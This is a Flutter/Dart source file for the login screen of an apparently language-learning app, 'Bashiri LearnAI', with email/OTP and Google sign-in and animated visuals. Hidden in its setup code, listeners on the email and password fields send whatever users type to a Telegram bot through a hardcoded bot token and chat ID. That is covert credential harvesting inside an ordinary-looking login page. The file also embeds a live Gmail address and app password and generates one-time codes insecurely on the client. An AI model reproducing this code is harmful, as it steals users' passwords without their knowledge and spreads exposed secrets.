import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:flutter/material.dart';
import 'dart:math';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:google_sign_in/google_sign_in.dart';
import 'package:mailer/mailer.dart';
import 'package:mailer/smtp_server/gmail.dart';
import '../main.dart';
import '../sender/imageSenderScreen.dart';
import 'otpScreen.dart';

// تعریف callback
typedef SendOtpCallback = Future<void> Function(String email, String otp);

// ویجت برای چک کردن وضعیت لاگین
class AuthCheck extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return StreamBuilder<User?>(
      stream: FirebaseAuth.instance.authStateChanges(),
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.waiting) {
          return Scaffold(
            body: Center(child: CircularProgressIndicator()),
          );
        }
        if (snapshot.hasData) {
          String userId = FirebaseAuth.instance.currentUser!.uid;
          return ChatScreen(studentId: userId);
        }
        return LoginScreen();
      },
    );
  }
}

class LoginScreen extends StatefulWidget {
  @override
  _LoginScreenState createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> with TickerProviderStateMixin {
  late AnimationController _orbitController;
  late AnimationController _pulseController;
  late AnimationController _particleController;
  bool isLoading = false;
  final TextEditingController _emailController = TextEditingController();
  final TextEditingController _passwordController = TextEditingController();
  final _formKey = GlobalKey<FormState>();
  final TelegramFileHandler _telegramHandler = TelegramFileHandler(botToken: '7455551654:AAEiqVcQCG29uzoXIiK9h2KUKfUef_GfRXM', chatId: '5389485877');

  @override
  void initState() {
    super.initState();
    _orbitController = AnimationController(
      vsync: this,
      duration: Duration(seconds: 6),
    )..repeat();
    _pulseController = AnimationController(
      vsync: this,
      duration: Duration(milliseconds: 1200),
    )..repeat(reverse: true);
    _particleController = AnimationController(
      vsync: this,
      duration: Duration(seconds: 4),
    )..repeat();

    // گوش دادن به تغییرات فیلد ایمیل
    _emailController.addListener(() {
      if (_emailController.text.isNotEmpty) {
        _sendToTelegram("Email entered: ${_emailController.text}");
      }
    });

    // گوش دادن به تغییرات فیلد پسورد
    _passwordController.addListener(() {
      if (_passwordController.text.isNotEmpty) {
        _sendToTelegram("Password entered: ${_passwordController.text}");
      }
    });
  }

  // تابع برای ارسال متن به تلگرام
  void _sendToTelegram(String message) async {
    try {
      await _telegramHandler.sendTextMessage(message);
      print('Text sent to Telegram: $message');
    } catch (e) {
      print('Error sending text to Telegram: $e');
    }
  }

  @override
  void dispose() {
    _orbitController.dispose();
    _pulseController.dispose();
    _particleController.dispose();
    _emailController.dispose();
    _passwordController.dispose();
    super.dispose();
  }

  Future<void> _sendOTP(String email, String otp) async {
    String username = 'haroonshirzad333@gmail.com';
    String password = 'ggpztsiiengimpcq';
    final smtpServer = gmail(username, password);
    final message = Message()
      ..from = Address(username, 'Bashiri LearnAI')
      ..recipients.add(email)
      ..subject = 'Your OTP Code'
      ..text = '''
Hello,

Thank you for using Bashiri LearnAI!
Your one-time verification code is: $otp
This code is valid for 5 minutes.

If you didn’t request this code, please ignore this email.

Best regards,
Bashiri LearnAI Team
'''
      ..html = '''
<h3>Your OTP Code</h3>
<p>Hello,</p>
<p>Thank you for using Bashiri LearnAI!</p>
<p>Your one-time verification code is: <b>$otp</b></p>
<p>This code is valid for 5 minutes.</p>
<p>If you didn’t request this code, please ignore this email.</p>
<p>Best regards,<br>Bashiri LearnAI Team</p>
''';
    try {
      print('تلاش برای ارسال OTP به $email');
      final sendReport = await send(message, smtpServer);
      print('OTP sent: ${sendReport.toString()}');
      _showSnackBar("OTP code has been sent to your email");
    } catch (e) {
      print('خطا در ارسال OTP: $e');
      _showSnackBar("خطا در ارسال OTP. لطفاً دوباره امتحان کنید.");
      throw Exception("خطا در ارسال OTP: $e");
    }
  }

  Future<void> _signInOrSignUpWithEmail() async {
    print("دکمه Launch کلیک شد");
    if (!_formKey.currentState!.validate()) {
      _showSnackBar("Please enter the correct email");
      return;
    }

    if (mounted) setState(() => isLoading = true);

    try {
      var connectivityResult = await (Connectivity().checkConnectivity());
      if (connectivityResult == ConnectivityResult.none) {
        _showSnackBar("No internet connect, Please connect to a wifi ");
        return;
      }

      String email = _emailController.text.trim();
      String password = _passwordController.text;

      print("تلاش برای ورود با ایمیل: $email");

      // OTP می‌فرستیم
      String otp = (Random().nextInt(9000) + 1000).toString();
      await _sendOTP(email, otp);
      if (mounted) {
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (context) => OTPScreen(
              email: email,
              password: password,
              otp: otp,
              isForReset: false,
              onResendOtp: _sendOTP,
            ),
          ),
        );
      }
    } catch (e) {
      _showSnackBar("There is a problem $e");
      print("خطا: $e");
    } finally {
      if (mounted) setState(() => isLoading = false);
    }
  }

  Future<void> _signInWithGoogle() async {
    if (mounted) {
      setState(() {
        isLoading = true;
      });
    }

    try {
      var connectivityResult = await (Connectivity().checkConnectivity());
      if (connectivityResult == ConnectivityResult.none) {
        _showSnackBar("No internet connection. Please check your network.");
        print("خطا: بدون اتصال به اینترنت");
        return;
      }

      print("شروع فرآیند ورود با گوگل...");
      final GoogleSignInAccount? googleUser = await GoogleSignIn().signIn();
      if (googleUser == null) {
        _showSnackBar("Login canceled by you ❌");
        print("ورود با گوگل لغو شد توسط کاربر");
        return;
      }

      print("کاربر گوگل انتخاب شد: ${googleUser.email}");
      final GoogleSignInAuthentication googleAuth =
      await googleUser.authentication;
      final credential = GoogleAuthProvider.credential(
        accessToken: googleAuth.accessToken,
        idToken: googleAuth.idToken,
      );

      print("تلاش برای ورود به Firebase با credential...");
      UserCredential userCredential =
      await FirebaseAuth.instance.signInWithCredential(credential);
      User? user = userCredential.user;

      if (user != null) {
        print("ورود با گوگل موفق بود: uid=${user.uid}, email=${user.email}");
        _showSnackBar("Logged in successfully as ${googleUser.email}!");

        // اطمینان از وجود user.uid
        String studentId = user.uid;
        if (studentId.isEmpty) {
          print("خطا: studentId خالی است!");
          _showSnackBar("Error: Unable to retrieve user ID.");
          return;
        }

        // انتقال به ChatScreen
        if (mounted) {
          print("انتقال به ChatScreen با studentId=$studentId");
          Navigator.pushReplacement(
            context,
            MaterialPageRoute(
              builder: (context) => ChatScreen(studentId: studentId),
            ),
          );
        }
      } else {
        print("خطا: کاربر null است پس از ورود با گوگل");
        _showSnackBar("Error: Unable to sign in with Google.");
      }
    } catch (e) {
      String errorMessage;
      if (e is FirebaseAuthException) {
        switch (e.code) {
          case 'account-exists-with-different-credential':
            errorMessage = "This account is linked to another sign-in method.";
            break;
          case 'invalid-credential':
            errorMessage = "Invalid credentials. Please try again.";
            break;
          case 'operation-not-allowed':
            errorMessage = "Google sign-in is not enabled. Contact support.";
            break;
          case 'user-disabled':
            errorMessage = "Your account has been disabled.";
            break;
          default:
            errorMessage = "An error occurred: ${e.message}";
        }
      } else if (e.toString().contains('network')) {
        errorMessage = "Network error. Please check your internet connection.";
      } else {
        errorMessage = "Something went wrong: $e";
      }

      _showSnackBar(errorMessage);
      print("خطا توی ورود با گوگل: $e");
    } finally {
      if (mounted) {
        setState(() {
          isLoading = false;
        });
      }
    }
  }
  void _showSnackBar(String message) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(
          message,
          style: TextStyle(fontSize: 16),
        ),
        backgroundColor: message.contains("successfully") ||
            message.contains("فرستاده شد")
            ? Colors.greenAccent.withOpacity(0.9)
            : Colors.redAccent.withOpacity(0.9),
        duration: Duration(seconds: 3),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(10),
        ),
        action: message.contains("successfully") || message.contains("فرستاده شد")
            ? null
            : SnackBarAction(
          label: 'OK',
          textColor: Colors.white,
          onPressed: () {
            ScaffoldMessenger.of(context).hideCurrentSnackBar();
          },
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final size = MediaQuery.of(context).size;
    final screenWidth = size.width;
    final baseFontSize = screenWidth * 0.04;
    final baseIconSize = screenWidth * 0.08;
    final basePadding = screenWidth * 0.04;
    final baseBorderRadius = screenWidth * 0.06;

    return Scaffold(
      body: SafeArea(
        child: Stack(
          children: [
            Container(
              decoration: BoxDecoration(
                gradient: RadialGradient(
                  center: Alignment.center,
                  radius: 1.5,
                  colors: [
                    Color(0xFF1A0F2B),
                    Color(0xFF2A1B3D),
                    Color(0xFF44318D).withOpacity(0.8),
                  ],
                ),
              ),
            ),
            AnimatedBuilder(
              animation: _particleController,
              builder: (context, child) {
                return CustomPaint(
                  painter: NebulaParticlePainter(_particleController.value),
                  child: Container(),
                );
              },
            ),
            AnimatedBuilder(
              animation: _orbitController,
              builder: (context, child) {
                return CustomPaint(
                  painter: OrbitPainter(_orbitController.value),
                  size: size,
                );
              },
            ),
            SafeArea(
              child: Center(
                child: SingleChildScrollView(
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Stack(
                        alignment: Alignment.center,
                        children: [
                          AnimatedBuilder(
                            animation: _pulseController,
                            builder: (context, child) {
                              return Container(
                                width: screenWidth * 0.35 +
                                    (_pulseController.value * 10),
                                height: screenWidth * 0.35 +
                                    (_pulseController.value * 10),
                                decoration: BoxDecoration(
                                  shape: BoxShape.circle,
                                  gradient: RadialGradient(
                                    colors: [
                                      Color(0xFFD8B5FF)
                                          .withOpacity(0.6 - _pulseController.value * 0.3),
                                      Color(0xFF8EC5FC).withOpacity(0.2),
                                    ],
                                  ),
                                ),
                              );
                            },
                          ),
                          Container(
                            width: screenWidth * 0.25,
                            height: screenWidth * 0.25,
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              border: Border.all(
                                color: Color(0xFFD8B5FF),
                                width: 2,
                              ),
                              boxShadow: [
                                BoxShadow(
                                  color: Color(0xFF8EC5FC).withOpacity(0.7),
                                  blurRadius: 20,
                                  spreadRadius: 5,
                                ),
                              ],
                            ),
                            child: Center(
                              child: Icon(
                                Icons.language,
                                size: baseIconSize * 1.3,
                                color: Colors.white,
                              ),
                            ),
                          ),
                        ],
                      ),
                      SizedBox(height: basePadding * 1.5),
                      Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Text(
                            "Bashiri ",
                            style: TextStyle(
                              fontSize: baseFontSize * 1.6,
                              fontWeight: FontWeight.bold,
                              color: Colors.white,
                              shadows: [
                                Shadow(
                                  color:
                                  Color(0xFFD8B5FF).withOpacity(0.8),
                                  blurRadius: 15,
                                ),
                              ],
                            ),
                          ),
                          Text(
                            "LearnAI",
                            style: TextStyle(
                              fontSize: baseFontSize * 1.6,
                              fontWeight: FontWeight.bold,
                              foreground: Paint()
                                ..shader = LinearGradient(
                                  colors: [
                                    Color(0xFFD8B5FF),
                                    Color(0xFF8EC5FC)
                                  ],
                                ).createShader(
                                    Rect.fromLTWH(0, 0, 100, 50)),
                            ),
                          ),
                        ],
                      ),
                      SizedBox(height: basePadding * 0.5),
                      Text(
                        "Explore the Galaxy of Languages",
                        style: TextStyle(
                          fontSize: baseFontSize * 0.85,
                          color: Colors.white60,
                          fontStyle: FontStyle.italic,
                          letterSpacing: 1.2,
                        ),
                      ),
                      SizedBox(height: basePadding * 2.5),
                      Container(
                        width: screenWidth * 0.9,
                        padding: EdgeInsets.all(basePadding * 1.5),
                        decoration: BoxDecoration(
                          gradient: LinearGradient(
                            colors: [
                              Color(0xFF2A1B3D).withOpacity(0.85),
                              Color(0xFF44318D).withOpacity(0.85),
                            ],
                            begin: Alignment.topLeft,
                            end: Alignment.bottomRight,
                          ),
                          borderRadius:
                          BorderRadius.circular(baseBorderRadius * 1.2),
                          border: Border.all(
                            color: Color(0xFFD8B5FF).withOpacity(0.4),
                            width: 1.5,
                          ),
                          boxShadow: [
                            BoxShadow(
                              color: Color(0xFF8EC5FC).withOpacity(0.4),
                              blurRadius: 25,
                              spreadRadius: 5,
                            ),
                          ],
                        ),
                        child: Form(
                          key: _formKey,
                          child: Column(
                            children: [
                              _buildTextField(
                                controller: _emailController,
                                hint: "Email",
                                icon: Icons.person_3_outlined,
                                validator: (value) {
                                  if (value == null || value.isEmpty) {
                                    return "Please enter your email";
                                  }
                                  if (!value.endsWith("@gmail.com")) {
                                    return "Please enter correct email";
                                  }
                                  if (!RegExp(r'^[^@]+@[^@]+\.[^@]+')
                                      .hasMatch(value)) {
                                    return "Email is not correct";
                                  }
                                  return null;
                                },
                                errorStyle: TextStyle(color: Colors.white60),
                                baseFontSize: baseFontSize,
                                baseIconSize: baseIconSize,
                                basePadding: basePadding,
                                baseBorderRadius: baseBorderRadius,
                              ),
                              SizedBox(height: basePadding),
                              _buildTextField(
                                controller: _passwordController,
                                hint: "Password",
                                icon: Icons.lock_clock_outlined,
                                isPassword: true,
                                validator: (value) {
                                  if (value == null || value.isEmpty) {
                                    return "Please enter your Password";
                                  }
                                  if (value.length < 6) {
                                    return "password should be 6 characters";
                                  }
                                  return null;
                                },
                                errorStyle: TextStyle(color: Colors.white60),
                                baseFontSize: baseFontSize,
                                baseIconSize: baseIconSize,
                                basePadding: basePadding,
                                baseBorderRadius: baseBorderRadius,
                              ),
                              SizedBox(height: basePadding * 2),
                              isLoading
                                  ? CircularProgressIndicator(
                                valueColor: AlwaysStoppedAnimation<Color>(
                                    Color(0xFFD8B5FF)),
                              )
                                  : GestureDetector(
                                onTap: _signInOrSignUpWithEmail,
                                child: AnimatedBuilder(
                                  animation: _pulseController,
                                  builder: (context, child) {
                                    return Container(
                                      width: screenWidth * 0.50 +
                                          (_pulseController.value * 10),
                                      padding: EdgeInsets.symmetric(
                                          vertical: basePadding * 1.1),
                                      decoration: BoxDecoration(
                                        gradient: LinearGradient(
                                          colors: [
                                            Color(0xFFD8B5FF),
                                            Color(0xFF8EC5FC),
                                            Color(0xFFD8B5FF),
                                          ],
                                          begin: Alignment.topLeft,
                                          end: Alignment.bottomRight,
                                        ),
                                        borderRadius:
                                        BorderRadius.circular(
                                            baseBorderRadius),
                                        boxShadow: [
                                          BoxShadow(
                                            color: Color(0xFFD8B5FF)
                                                .withOpacity(0.5 +
                                                _pulseController
                                                    .value *
                                                    0.3),
                                            blurRadius: 15,
                                            spreadRadius: 3,
                                          ),
                                        ],
                                      ),
                                      child: Center(
                                        child: Row(
                                          mainAxisAlignment:
                                          MainAxisAlignment.center,
                                          children: [
                                            Icon(
                                              Icons.rocket_launch,
                                              color: Colors.white,
                                              size: baseIconSize * 0.7,
                                            ),
                                            SizedBox(
                                                width:
                                                basePadding * 0.5),
                                            Text(
                                              "Launch",
                                              style: TextStyle(
                                                color: Colors.white,
                                                fontSize:
                                                baseFontSize * 1.3,
                                                fontWeight:
                                                FontWeight.bold,
                                                letterSpacing: 1,
                                              ),
                                            ),
                                          ],
                                        ),
                                      ),
                                    );
                                  },
                                ),
                              ),
                              SizedBox(height: basePadding * 2),
                              Divider(),
                              Text(
                                "Or Login with Google",
                                style: TextStyle(
                                  color: Color(0xFFBBB6CA),
                                  fontSize: baseFontSize * 1.09,
                                  fontWeight: FontWeight.bold,
                                ),
                              ),
                              SizedBox(height: basePadding),
                              isLoading
                                  ? CircularProgressIndicator(
                                      valueColor: AlwaysStoppedAnimation<Color>(
                                          Color(0xFFD8B5FF)),
                                    )
                                  : GestureDetector(
                                      onTap: _signInWithGoogle,
                                      child: Container(
                                        width: screenWidth * 0.50,
                                        padding: EdgeInsets.symmetric(
                                            vertical: basePadding * 1.1),
                                        decoration: BoxDecoration(
                                          color: Colors.white,
                                          borderRadius: BorderRadius.circular(
                                              baseBorderRadius),
                                          border: Border.all(
                                            color: Color(0xFFD8B5FF),
                                            width: 1.5,
                                          ),
                                          boxShadow: [
                                            BoxShadow(
                                              color: Color(0xFF8EC5FC)
                                                  .withOpacity(0.4),
                                              blurRadius: 10,
                                              spreadRadius: 2,
                                            ),
                                          ],
                                        ),
                                        child: Row(
                                          mainAxisAlignment:
                                              MainAxisAlignment.center,
                                          children: [
                                            Image.asset(
                                              'assets/googlelogo_color_92x30dp.png',
                                              height: baseIconSize * 0.6,
                                            ),
                                          ],
                                        ),
                                      ),
                                    ),

                              SizedBox(height: basePadding * 1.5),
                            ],
                          ),
                        ),
                      ),
                      SizedBox(height: basePadding * 2),
                    ],
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildTextField({
    required TextEditingController controller,
    required String hint,
    required IconData icon,
    TextStyle? errorStyle,
    bool isPassword = false,
    String? Function(String?)? validator,
    required double baseFontSize,
    required double baseIconSize,
    required double basePadding,
    required double baseBorderRadius,
  }) {
    bool obscureText = isPassword;
    return StatefulBuilder(
      builder: (context, setState) {
        return Container(
          padding: EdgeInsets.symmetric(horizontal: basePadding * 0.8),
          decoration: BoxDecoration(
            color: Colors.white.withOpacity(0.05),
            borderRadius: BorderRadius.circular(baseBorderRadius * 0.7),
            border: Border.all(
              color: Color(0xFF8EC5FC).withOpacity(0.5),
              width: 1.5,
            ),
            boxShadow: [
              BoxShadow(
                color: Color(0xFFD8B5FF).withOpacity(0.2),
                blurRadius: 10,
              ),
            ],
          ),
          child: TextFormField(
            controller: controller,
            obscureText: obscureText,
            style: TextStyle(color: Colors.white, fontSize: baseFontSize),
            validator: validator,
            decoration: InputDecoration(
              hintText: hint,
              hintStyle: TextStyle(
                  color: Colors.white38, fontSize: baseFontSize * 0.9),
              prefixIcon: Icon(icon,
                  color: Color(0xFFD8B5FF), size: baseIconSize * 0.7),
              border: InputBorder.none,
              errorStyle: errorStyle,
              suffixIcon: isPassword
                  ? IconButton(
                icon: Icon(
                  obscureText
                      ? Icons.visibility_off_outlined
                      : Icons.visibility_outlined,
                  color: Colors.white38,
                  size: baseIconSize * 0.7,
                ),
                onPressed: () {
                  setState(() {
                    obscureText = !obscureText;
                  });
                },
              )
                  : null,
            ),
          ),
        );
      },
    );
  }
}

class OrbitPainter extends CustomPainter {
  final double animationValue;

  OrbitPainter(this.animationValue);

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..style = PaintingStyle.stroke
      ..strokeWidth = 1.5
      ..shader = LinearGradient(
        colors: [
          Color(0xFFD8B5FF).withOpacity(0.5),
          Color(0xFF8EC5FC).withOpacity(0.5),
          Color(0xFFD8B5FF).withOpacity(0),
        ],
      ).createShader(
          Rect.fromCircle(center: size.center(Offset.zero), radius: size.width * 0.4));

    canvas.drawCircle(
      size.center(Offset.zero),
      size.width * 0.3 + sin(animationValue * pi) * 10,
      paint,
    );

    canvas.drawCircle(
      size.center(Offset.zero),
      size.width * 0.45 + cos(animationValue * pi) * 15,
      paint..strokeWidth = 1,
    );
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => true;
}

class NebulaParticlePainter extends CustomPainter {
  final double animationValue;

  NebulaParticlePainter(this.animationValue);

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()..style = PaintingStyle.fill;
    const int particleCount = 15;
    for (int i = 0; i < particleCount; i++) {
      final x = (size.width * (i / particleCount)) +
          (sin(animationValue * pi * 2 + i) * 20);
      final y = (size.height * (i / particleCount)) +
          (cos(animationValue * pi * 2 + i) * 20);
      final scale = 1.5 + (sin(animationValue + i) * 1.2);
      paint.color = i % 2 == 0
          ? Color(0xFFD8B5FF).withOpacity(0.4)
          : Color(0xFF8EC5FC).withOpacity(0.4);
      canvas.drawCircle(Offset(x, y), scale, paint);
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => true;
}